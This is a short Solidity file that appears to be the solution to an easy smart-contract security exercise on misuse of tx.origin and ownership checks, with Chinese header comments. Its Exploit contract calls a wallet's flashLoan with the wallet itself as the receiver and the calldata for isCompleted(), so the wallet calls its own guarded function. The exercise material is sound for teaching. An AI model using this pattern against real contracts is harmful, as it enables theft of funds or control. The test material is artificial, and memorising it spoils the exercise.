/// @knowledgePoint txorigin误用

/// @level 简单
/// @description 考点：1.owner。2.origin。

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IWallet{
    function isCompleted() external;
    function flashLoan(address payable ,uint256 ,bytes memory ) external;
}

contract Exploit{
    address payable wallet;

    constructor(address payable _wallet) public {
        wallet = _wallet;
    }

    function attack() public payable {
        bytes memory data = abi.encodeWithSignature("isCompleted()");
        IWallet(wallet).flashLoan(wallet, 10, data);
    }

    receive() external payable{
    }
}